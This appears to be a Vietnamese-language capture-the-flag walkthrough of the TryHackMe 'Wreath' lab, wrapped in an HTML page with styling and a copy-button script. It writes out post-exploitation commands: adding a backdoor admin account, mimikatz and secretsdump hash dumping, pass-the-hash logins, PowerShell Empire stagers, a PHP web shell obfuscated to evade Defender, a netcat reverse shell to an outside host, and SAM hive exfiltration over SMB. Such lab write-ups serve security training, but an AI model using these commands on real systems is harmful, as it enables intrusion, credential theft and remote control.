+<p><img alt="" src="../media/Wreath%20-%20tryhackme_12.png" /></p>
+<p>POST EXPLOIT</p>
+<p>net user dai 1:Giterver /add</p>
+<p>Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:</p>
+<p>net localgroup Administrators dai /add
+net localgroup "Remote Management Users" dai /add</p>
+<p>Login rdp with remmina</p>
+<p>xfreerdp /u:dai1 /p:'nodai1' /v:10.200.84.150 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share</p>
+<p>bật cmd trên rdp rồi chạy mimikatz nếu</p>
+<p>Lưu ý: Nếu bạn đã sử dụng một share name khác, bạn sẽ cần thay thế điều này. Cũng như vậy, nếu lỗi lệnh, bạn có thể cần cài đặt mimikatz trên kali.</p>
+<p>Vd: Dùng evil để upload mimikatz</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_13.png" /></p>
+<p>tiếp theo, chúng ta cần tự cấp cho mình quyền debug và nâng tính toàn vẹn của mình lên system level</p>
+<p>privilege::debug
+token::elevate</p>
+<p>Bây giờ chúng ta có thể dump tất cả SAM local password hashes bằng cách sử dụng:</p>
+<p>lsadump::sam</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_14.png" /></p>
+<p>Sau khi dump ta có hash của admin và Thomas</p>
+<p>Dùng crack station để crack thì được pass tài khoản Thomas :</p>
+<p>i&lt;3ruby</p>
+<p>Sau đó, dùng evil-winrm để remote vào tài khoản admin</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_15.png" /></p>
+<p>POWERHSELL EMPIRE</p>
+<p>Khởi động empire server</p>
+<p>Nếu lỗi, dùng lệnh</p>
+<p>sudo lsof -n -i :5000 | grep LISTEN</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_16.png" /></p>
+<p>Khởi động empire client</p>
+<p>Use listener</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_17.png" /></p>
+<p>Use stager</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_18.png" /></p>
+<p>Paste payload vào host target .200 để empire nhận được agent</p>
+<p>Use lisenter</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_19.png" /></p>
+<p>Nén thư mục /tmp/http_hop  thành file zip, rồi tạo web server bằng python. Tiếp tục dung curl trên target .200 để download và giải nén.</p>
+<p>Mở port và chạy server php:</p>
+<p>php -S 0.0.0.0:PORT &amp;&gt;/dev/null &amp;</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_20.png" /></p>
+<p>usestager multi/launcher</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_21.png" /></p>
+<p>Chạy payload</p>
+<p>curl -X POST http://10.200.84.150/web/exploit-dai.php -d "a=payload"</p>
+<p>hoặc đăng nhập vào git server để chạy trực tiếp payload đã được tạo</p>
+<p>evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150</p>
+<p>powershell -noP -sta -w 1 -enc "payload"</p>
+<p>tiếp tục với Use module<img alt="" src="../media/Wreath%20-%20tryhackme_22.png" /></p>
+<p>kết quả có thể hiện ra một số cve để leo thang</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_23.png" /></p>
+<p>Chuyển qua giai đoạn enum host cuối cùng.</p>
+<p>Dùng evil-winrm để link tới script của empire.</p>
+<p>sudo evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s   /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network</p>
+<p>sau đó chạy scan:</p>
+<p>Invoke-Portscan -Hosts 10.200.84.100 -TopPorts 50</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_24.png" /></p>
+<p>netsh advfirewall firewall add rule name="Chisel-dai" dir=in action=allow protocol=tcp localport=47000</p>
+<p>.\chisel.exe server -p 47210 --socks5</p>
+<p>chisel client 10.200.84.150:47210 2080:socks</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_25.png" /></p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_26.png" /></p>
+<p>Set sockproxy qua poxyproxy</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_27.png" /></p>
+<p>download C:\GitStack\repositories\Website.git</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_28.png" /></p>
+<p>Đổi tên thư mục git và dùng git tools để extract</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_29.png" /></p>
+<p>List các thư mục và filter lại commit:</p>
+<p>separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_30.png" /></p>
+<p>Tìm các file php để review code</p>
+<p>find . -name "*.php"</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_31.png" /></p>
+<p>Scan directory qua proxy</p>
+<p>dirb http://10.200.84.100/ -p socks5://127.0.0.1:2080</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_32.png" /></p>
+<p>Sử dụng tài khoản Thomas đã crack ở trước để truy cập vào resources</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_33.png" /></p>
+<p>Tải file image bất kỳ sau đó them đuổi php.</p>
+<p>Dùng exiftool để tạo payload payload rule upload file.</p>
+<p>exiftool -Comment="&lt;?php echo \"<pre>Test Payload</pre>\"; die(); ?&gt;"  background.jpg.php</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_34.png" /></p>
+<p>Upload và vào đường dẫn file vừa upload để test thử.</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_35.png" /></p>
+<p>Code php để lấy shell:</p>
+<?php
+
+$cmd = $_GET["wreath"];
+
+if(isset($cmd)){
+
+echo "<pre>" . shell_exec($cmd) . "</pre>";
+
+}
+
+die();
+
+?>
+
+<p>Dùng Obfuscator để bypass window defender:</p>
+<p>Dùng exiftool để add code vào comment</p>
+<p>exiftool -Comment="&lt;?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?&gt;" background.jpg.php</p>
+<p>Sau đó upload lại ta được như hình</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_36.png" /></p>
+<p>Tải bản nc đã được obfuscate</p>
+<p>git clone https://github.com/int0x33/nc.exe/</p>
+<p>cd nc.exe</p>
+<p>dùng curl vào web 100</p>
+<p>curl http://10.50.85.26//nc64.exe -o c:\windows\temp\nc-dai.exe</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_37.png" /></p>
+<p>Dùng nc để lắng nghe</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_38.png" /></p>
+<p>powershell.exe c:\windows\temp\nc-dai.exe 10.50.85.26 443 -e cmd.exe</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_39.png" /></p>
+<p>Tiến hành enum trên shell được trả về</p>
+<p>whoami /priv</p>
+<p>whoami /groups</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_40.png" /></p>
+<p>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"</p>
+<p>sc qc SystemExplorerHelpService</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_41.png" /></p>
+<p>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_42.png" /></p>
+<p>Tạo smb server trên máy kali</p>
+<p>sudo smbserver.py share /home/kali/Desktop/ -smb2support -username user -password s3cureP@ssword</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_43.png" /></p>
+<p>net use \10.50.85.26\share /USER:user s3cureP@ssword</p>
+<p>copy \10.50.85.26\share\Wrapper.exe %TEMP%\wrapper-dai.exe</p>
+<p>net use \10.50.85.26\share /del</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_44.png" /></p>
+<p>Dùng nc trên kali để lắng nghe qua port 443, sau đó chạy file vừa copy được</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_45.png" /></p>
+<p>Kết quả.</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_46.png" /></p>
+<p>Leo thang</p>
+<p>sc start SystemExplorerHelpService</p>
+<p>net use \10.50.85.26\share /user:10.50.85.26\user s3cureP@ssword</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_47.png" /></p>
+<p>reg.exe save HKLM\SAM \10.50.85.26\share\sam.bak</p>
+<p>reg.exe save HKLM\SYSTEM \10.50.85.26\share\system.bak</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_48.png" /></p>
+<p>secretsdump.py -sam  sam.bak -system system.bak local</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_49.png" /></p>
+                </div>
+            </div>
+        </div>    
+    </body>
+    </html>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+
+.copy-button {
+  position: absolute;
+  right: 5px ;
+  top: 5px;
+  border: transparent;
+  background-color: transparent;
+  padding: 2px 6px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  border-radius: 8px;
+
+}
+
+.copy-button:hover {
+  background-color: #30363d; # Change this to a different color to create a hover effect
+}
+.material-icons{
+  line-height:1.3;
+  color: #7d8590;
+}
+
+pre {
+  position: relative;
+  # padding: 20px;
+  border: 1px solid #e7ee7;
+  overflow-x: auto; # Remove this line to disable horizontal scrolling
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: 6px;
+  margin-bottom: 20px;
+
+  # Add these lines to set a fixed width for the code block and wrap long lines
+  #width: 80%;
+  white-space: pre-wrap; 
+}
+
+pre code {
+  display: block;
+  border-radius: 8px;
+  background-color: #2d2d2d; # Change this to a different color to match the copy button background
+
+}
+
+
+
+
+@media only screen and (min-width: 280px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and mobiles */
+  }
+}
+
+@media only screen and (max-width: 768px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and desktops */
+  }
+}
+
+# @media (min-width: 576px) {
+#   img {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   img {
+#     max-width: 720px;
+#   }
+# }
+
+
+
+@media (min-width: 280px) {
+  .container {
+    max-width: 90%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+@media (min-width: 750px) {
+  .container {
+    max-width: 80%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+
+
+@media (min-width: 912px) {
+  .container {
+    max-width: 70%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+# @media (min-width: 1200px) {
+#   .container {
+#     max-width: 70%;
+#     margin: 0 auto;
+#     height: 100%;
+#   }
+# }
+
+# @media (min-width: 576px) {
+#   .container {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   .container {
+#     max-width: 620px;
+#     margin: 0;
+#   }
+# }
+
+# @media (min-width: 992px) {
+#   .container {
+#     max-width: 760px;
+#   }
+# }
+
+@media (min-width: 1200px) {
+  .container {
+    max-width: 735px;
+    margin: 0;
+    height: 100%;
+  }
+}
+
+# p { 
+#   text-indent: 10px;
+# }
+
+h2 {
+  font-size: 1.5rem;
+}
+
+h3 {
+  font-size: 1.3rem;
+}
+
+# .container {
+#   max-width: 100%; /* Set the container width to 100% */
+#   padding-left: 15px; /* Add some padding to the left */
+#   padding-right: 15px; /* Add some padding to the right */
+# }
+
+
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark-reasonable.min.css">
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var codeBlocks = document.querySelectorAll('pre code');
+    codeBlocks.forEach(function(codeBlock) {
+      var copyButton = document.createElement('button');
+      copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+      copyButton.classList.add('copy-button');
+      codeBlock.parentNode.insertBefore(copyButton, codeBlock);
+
+      copyButton.addEventListener('click', function() {
+        var code = codeBlock.textContent;
+        var textarea = document.createElement('textarea');
+        textarea.textContent = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        textarea.remove();
+        copyButton.innerHTML = '<i class="material-icons">check</i>';
+        setTimeout(function() {
+          copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+        }, 2000);
+      });
+    });
+
+    // Initialize highlight.js for syntax highlighting
+    hljs.initHighlightingOnLoad();
+  });
+</script>
